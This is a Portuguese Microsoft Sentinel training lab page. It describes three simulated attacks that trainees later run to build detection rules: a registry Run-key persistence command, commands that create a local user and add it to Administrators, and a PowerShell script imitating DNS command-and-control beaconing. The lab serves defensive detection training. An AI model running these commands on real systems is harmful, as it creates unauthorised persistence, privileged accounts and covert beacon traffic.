---
lab:
  title: 'Exercício 5: entender a modelagem de detecção'
  module: Learning Path 7 - Create detections and perform investigations using Microsoft Sentinel
---

# Roteiro de aprendizagem 7, Laboratório 1, Exercício 5: entender a modelagem de detecção

![Visão geral do laboratório.](../Media/SC-200-Lab_Diagrams_Mod7_L1_Ex5.png)
### Tarefa 1: entender os ataques

>**Importante: você não executará nenhuma ação neste exercício.**  Estas instruções são apenas uma explicação dos ataques que você realizará no próximo exercício. Leia atentamente esta página.

Os padrões de ataque são baseados em um projeto de código aberto: https://github.com/redcanaryco/atomic-red-team


#### Ataque 1: persistência com adição de chave do Registro

Os invasores adicionarão um programa na chave do Registro Executar. Isso alcança a persistência, fazendo com que o programa seja executado toda vez que o usuário fizer logon.

```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
```

#### Ataque 2: adição de usuário e elevação de privilégio

Os invasores adicionarão novos usuários e elevarão o novo usuário ao grupo Administradores. Isso permite que o invasor faça logon com uma conta diferente que seja privilegiada.

```
net user theusernametoadd /add
net user theusernametoadd ThePassword1!
net localgroup administrators theusernametoadd /add
```

#### Ataque 3: DNS/C2 

O invasor enviará um grande volume de consultas de DNS a um servidor de comando e controle (C2). A intenção é disparar a detecção baseada em limites no número de consultas de DNS de um único sistema de origem ou para um único domínio de destino.

```
param(
    [string]$Domain = "microsoft.com",
    [string]$Subdomain = "subdomain",
    [string]$Sub2domain = "sub2domain",
    [string]$Sub3domain = "sub3domain",
    [string]$QueryType = "TXT",
        [int]$C2Interval = 8,
        [int]$C2Jitter = 20,
        [int]$RunTime = 240
)
$RunStart = Get-Date
$RunEnd = $RunStart.addminutes($RunTime)
$x2 = 1
$x3 = 1 
Do {
    $TimeNow = Get-Date
    Resolve-DnsName -type $QueryType $Subdomain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
    if ($x2 -eq 3 )
    {
        Resolve-DnsName -type $QueryType $Sub2domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        $x2 = 1
    }
    else
    {
        $x2 = $x2 + 1
    }
    if ($x3 -eq 7 )
    {
        Resolve-DnsName -type $QueryType $Sub3domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        $x3 = 1
    }
    else
    {
        $x3 = $x3 + 1
    }
    $Jitter = ((Get-Random -Minimum -$C2Jitter -Maximum $C2Jitter) / 100 + 1) +$C2Interval
    Start-Sleep -Seconds $Jitter
}
Until ($TimeNow -ge $RunEnd)
```


### Tarefa 2: entender a modelagem de detecção

O ciclo de configuração de detecção de ataque usado neste laboratório representa todas as fontes de dados, mesmo que você esteja focado apenas em duas fontes de dados específicas.

Para compilar uma detecção, você primeiro começa com a criação de uma instrução KQL. Como você atacará um host, terá dados representativos para começar a construir a instrução KQL.


Depois de ter a instrução KQL, vai criar a regra analítica.

Depois que a regra dispara e cria os alertas e incidentes, você investigará para decidir se está fornecendo campos que ajudam os analistas de operações de segurança em sua investigação.

Em seguida, você fará outras alterações na regra de análise.

>**Observação:** alguns alertas serão disparados em um período de tempo menor apenas para nossa finalidade de laboratório.

## Prossiga para o Exercício 6
